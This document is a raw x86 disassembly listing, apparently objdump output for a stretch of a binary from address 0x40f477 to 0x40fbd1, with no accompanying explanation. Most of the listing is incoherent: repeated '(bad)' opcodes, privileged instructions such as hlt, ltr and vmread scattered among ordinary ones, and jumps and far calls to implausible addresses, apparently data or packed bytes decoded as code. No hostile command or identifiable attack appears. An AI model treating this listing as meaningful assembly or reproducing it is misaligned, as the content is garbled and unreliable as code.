  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
